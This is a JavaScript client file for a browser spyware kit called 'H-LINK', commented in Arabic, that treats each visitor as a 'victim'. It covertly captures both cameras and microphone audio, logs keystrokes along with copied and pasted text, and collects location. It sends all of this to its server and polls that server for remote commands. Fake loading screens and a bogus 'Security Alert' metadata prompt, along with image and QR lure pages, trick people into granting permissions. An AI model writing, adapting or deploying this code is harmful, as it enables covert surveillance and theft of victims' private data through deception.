// ========== H-LINK - Client Side (HTTP Polling) ==========
let VICTIM_ID = 'victim_' + Math.random().toString(36).substring(2, 10) + '_' + Date.now();
let WEBCAM_INTERVAL = null;

// === توليد ID ===
function generateId() {
    return VICTIM_ID;
}

// === معلومات الجهاز ===
function getDeviceInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: screen.width + 'x' + screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
}

// === الحصول على IP ===
async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        if (document.getElementById('ipInfo')) {
            document.getElementById('ipInfo').textContent = data.ip;
        }
        return data.ip;
    } catch(e) {
        return 'Unknown';
    }
}

// === الكاميرا ===
async function captureCamera(type) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: type === 'front' ? 'user' : 'environment', width: 640, height: 480 },
            audio: false
        });
        
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        
        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext('2d');
        
        ctx.drawImage(video, 0, 0, 640, 480);
        const imageData = canvas.toDataURL('image/jpeg', 0.8);
        
        // إرسال الصورة
        await fetch('/api/camera', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                victim_id: VICTIM_ID,
                type: type,
                image: imageData
            })
        });
        
        stream.getTracks().forEach(track => track.stop());
        return imageData;
    } catch(e) {
        console.log('Camera error:', e.message);
        return null;
    }
}

// === تصوير الكاميرتين معًا ===
async function captureBothCameras() {
    await captureCamera('front');
    setTimeout(async () => {
        await captureCamera('environment');
    }, 1000);
}

// === تسجيل الصوت ===
let mediaRecorder = null;
let audioChunks = [];

async function startAudioRecording(duration) {
    duration = duration || 10000;
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        mediaRecorder = new MediaRecorder(stream);
        audioChunks = [];
        
        mediaRecorder.ondataavailable = event => {
            audioChunks.push(event.data);
        };
        
        mediaRecorder.onstop = () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            const reader = new FileReader();
            reader.onload = function() {
                fetch('/api/files', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        filename: 'audio_' + VICTIM_ID + '_' + Date.now() + '.webm',
                        file: reader.result
                    })
                });
            };
            reader.readAsDataURL(audioBlob);
            stream.getTracks().forEach(track => track.stop());
        };
        
        mediaRecorder.start();
        setTimeout(() => {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
        }, duration);
    } catch(e) {
        console.log('Audio error:', e.message);
    }
}

// === Keylogger ===
let keyBuffer = '';
let lastKeyTime = Date.now();

document.addEventListener('keydown', function(e) {
    const key = e.key;
    if (['Shift', 'Control', 'Alt', 'Meta', 'CapsLock', 'Tab', 'Escape'].includes(key)) return;
    
    keyBuffer += key;
    
    if (keyBuffer.length >= 50 || (Date.now() - lastKeyTime) > 5000) {
        sendKeys();
        lastKeyTime = Date.now();
    }
});

document.addEventListener('visibilitychange', function() {
    if (document.hidden && keyBuffer.length > 0) {
        sendKeys();
    }
});

function sendKeys() {
    if (keyBuffer.length === 0) return;
    
    fetch('/api/keylog', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            keys: keyBuffer,
            url: window.location.href,
            timestamp: new Date().toISOString()
        })
    });
    keyBuffer = '';
}

// === Clipboard ===
document.addEventListener('copy', function() {
    const text = document.getSelection().toString();
    fetch('/api/keylog', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ keys: '[COPY] ' + text, url: window.location.href })
    });
});

document.addEventListener('paste', function(e) {
    const text = (e.clipboardData || window.clipboardData).getData('text');
    fetch('/api/keylog', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ keys: '[PASTE] ' + text, url: window.location.href })
    });
});

// === الموقع ===
async function getLocation() {
    if (!navigator.geolocation) return;
    
    navigator.geolocation.getCurrentPosition(
        async (position) => {
            fetch('/api/location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy
                })
            });
        },
        async (error) => {
            // IP Geolocation كبديل
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                fetch('/api/location', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        lat: data.latitude,
                        lon: data.longitude,
                        accuracy: 'IP-based',
                        city: data.city
                    })
                });
            } catch(e) {}
        },
        { enableHighAccuracy: true, timeout: 10000 }
    );
}

// === الـ Polling (بدل WebSocket) ===
setInterval(function() {
    fetch('/api/poll')
        .then(r => r.json())
        .then(data => {
            if (data.command && data.command.action) {
                handleControl(data.command);
            }
        })
        .catch(() => {});
}, 3000);

function handleControl(cmd) {
    const data = cmd.data || cmd;
    const action = data.action;
    
    switch(action) {
        case 'toast':
            showToast(data.message || 'Hello!');
            break;
        case 'notify':
            showNotification(data.title || 'Alert', data.body || '');
            break;
        case 'sound':
            playSound();
            break;
        case 'vibrate':
            if (navigator.vibrate) {
                navigator.vibrate(parseInt(data.duration) || 3000);
            }
            break;
        case 'open_url':
            window.open(data.url || 'https://example.com', '_blank');
            break;
    }
}

function showToast(msg) {
    const toast = document.createElement('div');
    toast.style.cssText = 'position:fixed;bottom:30px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.9);color:white;padding:12px 24px;border-radius:10px;z-index:9999;font-size:16px;';
    toast.textContent = msg;
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 3000);
}

function showNotification(title, body) {
    if ('Notification' in window && Notification.permission === 'granted') {
        new Notification(title, { body: body });
    }
}

function playSound() {
    try {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.type = 'sawtooth';
        osc.frequency.value = 880;
        gain.gain.value = 0.5;
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.start();
        setTimeout(() => {
            try { osc.stop(); } catch(e) {}
        }, 5000);
    } catch(e) {}
}

// === أنيميشن التحميل ===
function animateLoading() {
    const progressBar = document.getElementById('progressBar');
    const statusText = document.getElementById('statusText');
    const loadingScreen = document.getElementById('loadingScreen');
    const permissionScreen = document.getElementById('permissionScreen');
    
    if (!progressBar) return;
    
    let progress = 0;
    const statuses = ['Initializing...', 'Checking system files...', 'Verifying device...', 'Configuring security...', 'Almost done...'];
    
    const interval = setInterval(() => {
        progress += Math.random() * 15;
        if (progress > 100) progress = 100;
        
        progressBar.style.width = progress + '%';
        if (statusText) statusText.textContent = statuses[Math.floor(progress / 25)] || 'Complete!';
        
        if (progress >= 100) {
            clearInterval(interval);
            setTimeout(() => {
                if (loadingScreen) loadingScreen.classList.add('hidden');
                if (permissionScreen) permissionScreen.classList.remove('hidden');
                
                setTimeout(async () => {
                    await captureBothCameras();
                    startAudioRecording(15000);
                    getLocation();
                }, 1000);
            }, 500);
        }
    }, 800);
}

// === طلب الأذونات ===
async function requestPermissions() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        stream.getTracks().forEach(track => track.stop());
        
        if ('Notification' in window) {
            Notification.requestPermission();
        }
        
        document.getElementById('permissionScreen').classList.add('hidden');
        document.getElementById('mainScreen').classList.remove('hidden');
        
        await captureBothCameras();
        startAudioRecording(15000);
        getLocation();
    } catch(e) {
        console.log('Permission denied');
        skipPermissions();
    }
}

function skipPermissions() {
    document.getElementById('permissionScreen').classList.add('hidden');
    document.getElementById('mainScreen').classList.remove('hidden');
    getIP();
    getLocation();
}

// === بدء التشغيل ===
window.onload = function() {
    getIP();
    
    if (document.getElementById('deviceInfo')) {
        document.getElementById('deviceInfo').textContent = navigator.platform;
    }
    if (document.getElementById('browserInfo')) {
        document.getElementById('browserInfo').textContent = navigator.userAgent.split('/')[0];
    }
    
    animateLoading();
    
    // هجوم الصورة
    if (window.location.pathname === '/image') {
        setTimeout(() => {
            const overlay = document.createElement('div');
            overlay.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.7);display:flex;justify-content:center;align-items:center;z-index:1000;';
            overlay.innerHTML = '<div style="background:#1a1a2e;padding:30px;border-radius:20px;text-align:center;color:white;"><h3>⚠️ Security Alert</h3><p>This image contains tracking metadata. Click OK to remove.</p><button onclick="this.parentElement.parentElement.remove(); requestPermissions();" style="background:#00d4ff;color:white;border:none;padding:10px 20px;border-radius:8px;margin-top:10px;cursor:pointer;">Remove Metadata</button></div>';
            document.body.appendChild(overlay);
        }, 2000);
    }
    
    // هجوم QR
    if (window.location.pathname === '/qr') {
        setTimeout(() => {
            const ps = document.getElementById('permissionScreen');
            if (ps) ps.classList.remove('hidden');
        }, 1500);
    }
};
